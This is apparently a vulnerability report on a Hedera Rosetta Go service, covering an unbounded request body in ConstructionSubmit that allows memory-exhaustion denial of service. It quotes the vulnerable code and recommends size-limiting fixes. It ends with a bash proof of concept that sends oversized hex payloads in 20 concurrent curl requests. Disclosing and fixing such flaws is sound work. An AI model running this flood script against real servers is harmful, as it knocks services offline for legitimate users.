### Title
Unbounded Request Body in `ConstructionSubmit` Enables Memory Exhaustion DoS

### Summary
`ConstructionSubmit` in `rosetta/app/services/construction_service.go` accepts an arbitrarily large hex-encoded `SignedTransaction` string with no byte-based body size limit enforced at the application layer. An unauthenticated attacker can send a multi-megabyte payload, causing the server to allocate memory proportional to the payload size during `hex.DecodeString` and `hiero.TransactionFromBytes`, leading to memory exhaustion and denial of service.

### Finding Description

**Exact code path:**

`ConstructionSubmit` (lines 332–368) unconditionally passes `request.SignedTransaction` to `unmarshallTransactionFromHexString`:

```go
// rosetta/app/services/construction_service.go:340
transaction, rErr := unmarshallTransactionFromHexString(request.SignedTransaction)
```

`unmarshallTransactionFromHexString` (lines 658–674) performs two unbounded allocations:

```go
transactionBytes, err := hex.DecodeString(tools.SafeRemoveHexPrefix(transactionString))
// allocates len(input)/2 bytes in one shot

transaction, err := hiero.TransactionFromBytes(transactionBytes)
// protobuf deserialization: further heap allocations proportional to input
```

There is no length check on `transactionString` before either call.

**Root cause — no byte-based body size limit anywhere in the stack:**

`rosetta/main.go` (lines 220–227) configures the HTTP server with only time-based limits:

```go
httpServer := &http.Server{
    IdleTimeout:       rosettaConfig.Http.IdleTimeout,
    ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout,
    ReadTimeout:       rosettaConfig.Http.ReadTimeout,   // default 5 s
    WriteTimeout:      rosettaConfig.Http.WriteTimeout,
}
```

`http.MaxBytesReader` is never called anywhere in the rosetta codebase (confirmed: zero matches for `MaxBytesReader`, `LimitReader`, `maxBodySize` in `rosetta/**/*.go`). The `Http` config struct (`rosetta/app/config/types.go:64–69`) has no `MaxBodySize` field.

The rosetta-sdk-go controller layer reads and JSON-decodes the entire request body before the service method is invoked, meaning the `signed_transaction` string is first allocated as a Go `string` (full payload size), then `hex.DecodeString` allocates another `len/2` bytes, then `hiero.TransactionFromBytes` allocates further during protobuf parsing — a multiplier effect on a single large request.

**Why existing checks are insufficient:**

- `ReadTimeout` (default 5 s) is time-based, not byte-based. On a 100 Mbps connection an attacker delivers ~62 MB within the timeout window, causing ~31 MB of decoded bytes plus JSON string overhead per request.
- The Kubernetes/Traefik middleware (`inFlightReq: 5`, `rateLimit: 10/s`) in `charts/hedera-mirror-rosetta/values.yaml:152–160` is an optional deployment artifact, not enforced at the Go application level. Direct access to the pod bypasses it entirely.
- No authentication is required for `/construction/submit` — it is a public Rosetta API endpoint.

### Impact Explanation
An attacker can exhaust the server's heap memory, triggering OOM kills or severe GC pressure, taking the Rosetta node offline. Because `ConstructionSubmit` is the transaction broadcast endpoint, a sustained attack prevents all legitimate transaction submissions. Severity: **High** (unauthenticated DoS against a critical path endpoint).

### Likelihood Explanation
The attack requires no credentials, no special knowledge, and no prior state. A single HTTP POST with a multi-megabyte `signed_transaction` field is sufficient. The attack is trivially scriptable and repeatable. Without application-level rate limiting or body size enforcement, even a single attacker on a modest connection can sustain the attack indefinitely.

### Recommendation
1. Wrap the request body with `http.MaxBytesReader` in a middleware applied to all routes, e.g., 1 MB limit (Hedera transactions are bounded by consensus node limits, well under 1 MB):
   ```go
   func maxBodyMiddleware(next http.Handler, limit int64) http.Handler {
       return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
           r.Body = http.MaxBytesReader(w, r.Body, limit)
           next.ServeHTTP(w, r)
       })
   }
   ```
2. Add an explicit length check in `unmarshallTransactionFromHexString` before calling `hex.DecodeString`, rejecting strings exceeding a defined maximum (e.g., 6000 hex chars ≈ 3 KB, matching Hedera's transaction size limit).
3. Add a `MaxBodySize` field to the `Http` config struct and wire it into the middleware so operators can tune it.
4. Do not rely solely on Traefik/Kubernetes middleware for this protection — enforce it at the application layer.

### Proof of Concept
```bash
# Generate a 10 MB hex string (valid hex characters, invalid transaction content)
python3 -c "print('0x' + 'ab' * 10_000_000)" > /tmp/big_tx.txt

# Send to the submit endpoint (no authentication required)
curl -s -X POST http://<rosetta-host>:5700/construction/submit \
  -H 'Content-Type: application/json' \
  -d "{
    \"network_identifier\": {\"blockchain\": \"Hedera\", \"network\": \"testnet\"},
    \"signed_transaction\": \"$(cat /tmp/big_tx.txt)\"
  }"

# Repeat in a loop to exhaust memory:
for i in $(seq 1 20); do
  curl -s -X POST http://<rosetta-host>:5700/construction/submit \
    -H 'Content-Type: application/json' \
    -d "{\"network_identifier\":{\"blockchain\":\"Hedera\",\"network\":\"testnet\"},\"signed_transaction\":\"$(cat /tmp/big_tx.txt)\"}" &
done
wait
# Observe OOM kill or severe memory pressure on the rosetta process
```

The server will attempt to allocate ~5 MB per request (hex decode) plus JSON parse overhead. Twenty concurrent requests = ~100 MB+ of sudden heap allocation, with no application-level defense to stop it.